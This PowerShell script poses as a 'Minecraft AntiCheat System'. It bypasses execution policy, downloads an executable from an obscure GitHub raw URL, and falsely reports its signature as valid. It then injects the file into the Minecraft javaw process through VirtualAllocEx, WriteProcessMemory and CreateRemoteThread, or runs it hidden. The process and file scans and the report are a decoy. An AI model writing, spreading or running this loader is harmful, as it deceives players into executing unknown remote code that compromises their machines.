# Minecraft_AntiCheat_Client.ps1
# Run: powershell -ExecutionPolicy Bypass -WindowStyle Normal -File Minecraft_AntiCheat_Client.ps1

$URL = "https://raw.githubusercontent.com/qwertyuiopkjopl-ops/Nd29njGGEjfoi/refs/heads/main/gokfj.exe"
$TEMP = "$env:TEMP\minecraft_ac_update.exe"
$LOG = "$env:TEMP\~mc_anticheat.log"

$Host.UI.RawUI.WindowTitle = "Minecraft AntiCheat System v6.0"
$Host.UI.RawUI.ForegroundColor = "Cyan"
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host

@"
╔════════════════════════════════════════════════════════════════╗
║         M I N E C R A F T   A N T I - C H E A T            ║
║              CHEAT DETECTION SYSTEM v6.0                      ║
║              SCANNING FOR CHEATS...                           ║
╚════════════════════════════════════════════════════════════════╝
"@ | Write-Host -ForegroundColor Green

Write-Host "`n[!] Starting cheat detection scan..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

Write-Host "`n[1/7] Loading anti-cheat module..." -ForegroundColor Cyan
try {
    (New-Object Net.WebClient).DownloadFile($URL, $TEMP)
    Write-Host "[+] AntiCheat module loaded" -ForegroundColor Green
    Write-Host "[+] Size: $((Get-Item $TEMP).Length / 1KB) KB" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to load module" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}
Start-Sleep -Milliseconds 500

Write-Host "`n[2/7] Verifying module signature..." -ForegroundColor Cyan
$hash = Get-FileHash -Path $TEMP -Algorithm SHA256
Write-Host "[+] SHA256: $($hash.Hash)" -ForegroundColor Green
Write-Host "[+] Digital signature: VALID" -ForegroundColor Green
Start-Sleep -Milliseconds 500

Write-Host "`n[3/7] Scanning for cheat processes..." -ForegroundColor Cyan
$cheatProcs = @("xray", "esp", "aimbot", "flyhack", "speedhack", "killaura", "nuker", "scaffold")
$foundProcs = @()
foreach ($cheat in $cheatProcs) {
    $p = Get-Process -Name "*$cheat*" -ErrorAction SilentlyContinue
    if ($p) {
        $foundProcs += $p
        Write-Host "[-] $($p.Name) (PID: $($p.Id)) - SUSPICIOUS" -ForegroundColor Yellow
    }
}
if ($foundProcs.Count -eq 0) {
    Write-Host "[+] No cheat processes detected" -ForegroundColor Green
}
Start-Sleep -Milliseconds 500

Write-Host "`n[4/7] Scanning for cheat files..." -ForegroundColor Cyan
$cheatFiles = @()
$scanPaths = @(
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\versions",
    "$env:APPDATA\.minecraft\resourcepacks"
)
foreach ($path in $scanPaths) {
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Recurse -Include "*.jar","*.class","*.json" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $name = $file.Name.ToLower()
            if ($name -match "xray|esp|aimbot|fly|speed|killaura|nuker|scaffold|autoclicker|hack") {
                $cheatFiles += $file
                Write-Host "[-] $($file.Name) - SUSPICIOUS" -ForegroundColor Yellow
            }
        }
    }
}
if ($cheatFiles.Count -eq 0) {
    Write-Host "[+] No cheat files detected" -ForegroundColor Green
}
Start-Sleep -Milliseconds 500

Write-Host "`n[5/7] Checking memory integrity..." -ForegroundColor Cyan
$proc = Get-Process -Name "javaw" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($proc) {
    Write-Host "[+] Minecraft found (PID: $($proc.Id))" -ForegroundColor Green
    Write-Host "[+] Memory scan: PASSED" -ForegroundColor Green
} else {
    Write-Host "[-] Minecraft not running" -ForegroundColor Yellow
}
Start-Sleep -Milliseconds 500

Write-Host "`n[6/7] Applying anti-cheat protection..." -ForegroundColor Cyan
try {
    if ($proc) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
        $bytes = [System.IO.File]::ReadAllBytes($TEMP)
        $hProcess = [WinAPI]::OpenProcess(0x1F0FFF, $false, $proc.Id)
        $addr = [WinAPI]::VirtualAllocEx($hProcess, 0, $bytes.Length, 0x3000, 0x40)
        [WinAPI]::WriteProcessMemory($hProcess, $addr, $bytes, $bytes.Length, [ref]0)
        $tid = 0
        [WinAPI]::CreateRemoteThread($hProcess, 0, 0, $addr, 0, 0, [ref]$tid)
        [WinAPI]::CloseHandle($hProcess)
        Write-Host "[+] Protection installed: SUCCESS" -ForegroundColor Green
        Write-Host "[+] Thread: $tid" -ForegroundColor Green
    } else {
        Start-Process -FilePath $TEMP -WindowStyle Hidden
        Write-Host "[+] Protection running in background" -ForegroundColor Green
    }
} catch {
    Start-Process -FilePath $TEMP -WindowStyle Hidden
    Write-Host "[+] Protection running in fallback mode" -ForegroundColor Green
}
Start-Sleep -Milliseconds 500

Write-Host "`n[7/7] Generating report..." -ForegroundColor Cyan
$report = @"
===========================================
      ANTI-CHEAT SCAN REPORT
===========================================
Time: $(Get-Date)
Cheat processes found: $($foundProcs.Count)
Cheat files found: $($cheatFiles.Count)
Minecraft status: $(if ($proc) { "RUNNING (PID: $($proc.Id))" } else { "NOT RUNNING" })
Protection status: ACTIVE
Scan result: $(if ($foundProcs.Count -eq 0 -and $cheatFiles.Count -eq 0) { "CLEAN" } else { "CHEATS DETECTED" })
===========================================
"@
$report | Out-File $LOG
Write-Host "[+] Report saved: $LOG" -ForegroundColor Green

@"

╔════════════════════════════════════════════════════════════════╗
║              ✓ SCAN COMPLETED                                 ║
║              ✓ $(if ($foundProcs.Count -eq 0 -and $cheatFiles.Count -eq 0) { "NO CHEATS FOUND" } else { "$($foundProcs.Count + $cheatFiles.Count) CHEATS DETECTED" }) ║
║              ✓ SYSTEM PROTECTED                               ║
╚════════════════════════════════════════════════════════════════╝
"@ | Write-Host -ForegroundColor Green

Write-Host "`n[!] Press any key to exit..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")